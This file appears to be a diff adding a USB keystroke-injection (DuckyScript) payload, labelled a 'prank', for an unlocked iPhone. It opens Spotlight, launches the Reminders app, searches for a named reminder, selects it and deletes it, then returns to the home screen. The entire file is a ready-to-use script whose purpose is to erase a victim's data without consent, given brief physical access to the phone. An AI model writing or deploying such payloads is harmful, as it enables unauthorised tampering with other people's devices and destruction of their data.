@@ -1,0 +1,40 @@
+REM #####################################################
+REM #                                                   |
+REM # Title        : Delete A Reminder With An iPhone   |
+REM # Author       : Aleff                              |
+REM # Version      : 1.0                                |
+REM # Category     : Prank                              |
+REM # Target       : iPhone                             |
+REM #                                                   |
+REM #####################################################
+
+
+REM Requirements:
+REM     - The phone must be unlocked
+
+REM Tested on:
+REM     - iPhone 14
+REM     - iOS 16.4.1
+
+REM You need to change the name of the application according to the language you have on your phone.
+DEFINE #REMINDER-APP-NAME example
+REM You should know the reminder name that you want to delete
+DEFINE #REMINDER-NAME example
+
+GUI SPACE
+DELAY 300
+STRING #REMINDER-APP-NAME
+ENTER
+DELAY 2000
+GUI f
+DELAY 1000
+STRING #REMINDER-NAME
+DELAY 500
+TAB
+DELAY 500
+GUI a
+BACKSPACE
+DELAY 500
+ENTER
+DELAY 500
+GUI h
